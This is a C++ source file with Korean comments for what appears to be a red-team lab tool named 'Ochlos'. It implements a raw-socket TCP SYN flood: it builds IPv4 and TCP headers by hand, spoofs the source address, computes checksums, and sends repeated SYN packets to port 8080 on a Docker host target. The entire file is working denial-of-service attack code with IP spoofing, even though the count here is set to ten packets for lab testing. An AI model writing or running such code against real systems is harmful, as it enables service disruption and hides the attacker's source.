// 기존의 tcp_syn_flooding.cpp의 경우 connect()를 사용하기 때문에 3-way handshake를 수행
// 그로 인한 스레드 폭증이나 socket&FD 고갈 문제 발생

// raw sock를 사용하는 방식으로 진행

#include "ochlos_net.hpp"
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <iostream>
#ifndef _WIN32
#include <netdb.h>
#endif
#include <thread>

int main() {
#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }
    using SocketHandle = SOCKET;
    const SocketHandle kInvalidSocket = INVALID_SOCKET;
#else
    using SocketHandle = int;
    const SocketHandle kInvalidSocket = -1;
#endif

    std::cout << "[Ochlos] Raw TCP SYN Flooding Attack Tool Started.\n";

    // 1. Create Raw Socket for TCP protocol
    SocketHandle sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == kInvalidSocket) {
        std::cerr << "[-] Raw socket creation failed. (Check root/CAP_NET_RAW privileges)\n";
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    }

    // 2. Set IP_HDRINCL(IP HeaDeR INCLude) option : 데이터 버퍼 맨 앞에 ip header가 포함되어 있다는 의미
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, reinterpret_cast<const char *>(&one), sizeof(one)) < 0) {
        std::cerr << "[-] setsockopt(IP_HDRINCL) failed\n";
        return 1;
    }

    // 3. 40byte packet buffer 준비
    char packet_buffer[sizeof(IPHeader) + sizeof(TCPHeader)];
    std::memset(packet_buffer, 0, sizeof(packet_buffer));

    auto *ip = reinterpret_cast<IPHeader *>(packet_buffer);

    // 4. L3 IP 헤더 필드 작성 (OSI 3계층 네트워크 계층) (Populate L3 IP header fields)
    ip->ihl = 5;                                // 헤더 길이 (Header Length: 5 * 4 = 20바이트)
    ip->version = 4;                            // IPv4 버전 (IPv4 Version)
    ip->tos = 0;                                // 서비스 유형 (Type of Service / Best Effort)
    ip->tot_len = htons(sizeof(packet_buffer)); // 전체 패킷 길이 (Total Length: 40바이트)
    ip->id = htons(54321);                      // 패킷 식별자 (Packet Identification)
    ip->frag_off = 0;                           // 단편화 플래그 및 오프셋 (No Fragmentation)
    ip->ttl = 64;                               // 생존 시간 (Time to Live: 64 Hops)
    ip->protocol = IPPROTO_TCP;                 // 상위 프로토콜 번호 (Protocol: TCP = 6)

    // syn flooding의 특성상 어차피 답변을 받을 일은 없고, 그러면 패킷에 출발 주소(레드팀 주소)를 아무거나 해도 상관이 없다.
    // 이제 이 spoofing ip를 뭐로 하느냐에 따라서 또 탐색을 하던지, 여러 시나리오를 쓸 수 있다.
    // 나중에 뭐가 가장 적절한지를 따져봐도 될듯?
    inet_pton(AF_INET, "10.0.0.99", &ip->saddr); // 출발지 가상 Spoofing IP

    // [L3 DNS 해석] docker에서 window의 도메인을 host.docker.internal 이라고 지칭하기 때문에 그걸 IPv4로 전환해준다.
    const char *target_host = "host.docker.internal";
    struct addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(target_host, nullptr, &hints, &res) != 0 || res == nullptr) {
        std::cerr << "[-] Failed to resolve target host: " << target_host << "\n";
        return 1;
    }

    auto *ipv4 = reinterpret_cast<struct sockaddr_in *>(res->ai_addr);
    ip->daddr = ipv4->sin_addr.s_addr;
    freeaddrinfo(res);

    ip->check = calculate_checksum(reinterpret_cast<uint16_t *>(ip), sizeof(IPHeader)); // IP 헤더 체크섬 계산 (Calculate IP checksum)

    // 5. L4 TCP header field
    auto *tcp = reinterpret_cast<TCPHeader *>(packet_buffer + sizeof(IPHeader));
    tcp->source = htons(12345); // 임의 출발포트
    tcp->dest = htons(8080);    // target인 screening router port
    tcp->seq = htonl(0);        // sequence number
    tcp->ack_seq = 0;           // SYN packet = ACK 0
    tcp->doff = 5;              // Data Offset (header length)
    tcp->syn = 1;               // SYN flag
    tcp->window = htons(65535);

    // 6. Pseudo Header 기반 TCP checksum 계산
    PseudoHeader pseudo_header = create_pseudo_header(ip->saddr, ip->daddr, sizeof(TCPHeader));
    char pseudo_buffer[sizeof(PseudoHeader) + sizeof(TCPHeader)];
    std::memcpy(pseudo_buffer, &pseudo_header, sizeof(PseudoHeader));
    std::memcpy(pseudo_buffer + sizeof(PseudoHeader), tcp, sizeof(TCPHeader));

    tcp->check = calculate_checksum(reinterpret_cast<uint16_t *>(pseudo_buffer), sizeof(pseudo_buffer));

    // 7. dest addr에 대한 주소 구조체(sockaddr_in) 설정
    struct sockaddr_in target_addr;
    std::memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = tcp->dest;
    target_addr.sin_addr.s_addr = ip->daddr;

    // 8. Send Raw TCP SYN packet
    // std::cout << "[Ochlos] Sending Raw TCP SYN packet to host.docker.internal:8080...\n";
    // int sent_bytes = sendto(sock, packet_buffer, sizeof(packet_buffer), 0, reinterpret_cast<struct sockaddr *>(&target_addr), sizeof(target_addr));

    // 8-1. 반복적으로 전송
    // 동일한 src,dst,seq로 전송하면 docker의 NAT에서 재전송 처리를 하기 때문에 동일 세션에서 묶어서 보내버리기 때문에 의도와 다르게 작동하게 된다.
    const int repeat_count = 10;
    std::cout << "[Ochlos] Sending " << repeat_count << " Raw TCP SYN packets to host.docker.internal:8080...\n";

    for (int i = 0; i < repeat_count; i++) {
        int sent_bytes = sendto(sock, packet_buffer, sizeof(packet_buffer), 0, reinterpret_cast<struct sockaddr *>(&target_addr), sizeof(target_addr));

        if (sent_bytes < 0) {
#ifdef _WIN32
            std::cerr << "[-] sendto() failed. WSA Error COde: " << WSAGetLastError() << "\n";
#else
            std::cerr << "[-] sendto() failed. errno: " << errno << " (" << strerror(errno) << ")\n";
#endif
            break;
        }
    }

    std::cout << "[+] Completed sending " << repeat_count << " packets.\n";

// 9. 다 끝나고 나서 socket resource 정리
#ifdef _WIN32
    closesocket(sock);
    WSACleanup();
#else
    close(sock);
#endif

    return 0;
}